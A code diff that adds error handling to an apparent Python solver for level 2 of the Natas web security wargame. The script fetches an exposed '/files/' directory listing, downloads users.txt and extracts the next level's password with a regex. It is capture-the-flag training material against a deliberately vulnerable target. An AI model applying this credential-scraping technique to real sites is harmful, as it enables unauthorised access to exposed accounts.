@@ -20,23 +20,44 @@ def solve_natas2():
 
     files_url = url + "files/"
 
-    files_response = requests.get(files_url, auth=(username, password), timeout=10)
-
-    if "users.txt" in files_response.text:
-        users_url = files_url + "users.txt"
-
-        response = requests.get(users_url, auth=(username, password), timeout=10)
-
-        match = re.search(r"\s?natas3:(\w+)", response.text)
-
-        if match:
-            next_password = match.group(1)
-            print(f"Password found: {next_password}")
-
-            with open("natas3_password.txt", "w") as f:
-                f.write(next_password)
-            return next_password
+    try:
+        files_response = requests.get(
+            files_url, auth=(username, password), timeout=10
+        )
+        if files_response.status_code != 200:
+            print(f"[-] Error: Status code {files_response.status_code}")
+            return None
+    except requests.RequestException as e:
+        print(f"[-] Network error: {e}")
         return None
+
+    if "users.txt" not in files_response.text:
+        print("[-] users.txt not found in directory listing")
+        return None
+
+    users_url = files_url + "users.txt"
+
+    try:
+        response = requests.get(users_url, auth=(username, password), timeout=10)
+        if response.status_code != 200:
+            print(f"[-] Error fetching users.txt: Status code {response.status_code}")
+            return None
+    except requests.RequestException as e:
+        print(f"[-] Network error: {e}")
+        return None
+
+    match = re.search(r"\s?natas3:(\w+)", response.text)
+
+    if match:
+        next_password = match.group(1)
+        print(f"Password found: {next_password}")
+
+        with open("natas3_password.txt", "w") as f:
+            f.write(next_password)
+        return next_password
+
+    print("[-] Password not found in users.txt")
+    return None
 
 
 if __name__ == "__main__":
